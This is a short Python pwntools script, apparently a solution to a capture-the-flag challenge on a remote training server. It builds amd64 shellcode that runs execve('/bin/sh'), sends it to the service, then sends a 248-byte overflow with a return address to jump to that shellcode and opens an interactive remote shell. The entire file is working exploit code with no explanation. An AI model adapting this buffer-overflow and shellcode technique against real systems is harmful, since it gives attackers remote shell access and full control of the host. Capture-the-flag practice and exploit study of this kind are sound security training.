#!/usr/bin/env python
# -*- coding=utf-8 -*-

from pwn import *

context.arch = 'amd64'

offset = 248
addr = 0x601080

sc2 = asm('''
        xor rax, rax
        xor rdx, rdx
        xor rsi, rsi
        jmp str
    execv:
        mov rdi, [rsp]
        mov rax, 0x3b
        syscall
    str:
        call execv
        .ascii "/bin/sh"
        .byte 0
    ''')

r = remote('csie.ctf.tw', 10126)
print(r.recv())
r.sendline(sc2)
print(r.recv())
r.sendline('a'*offset + p64(addr))
r.interactive()
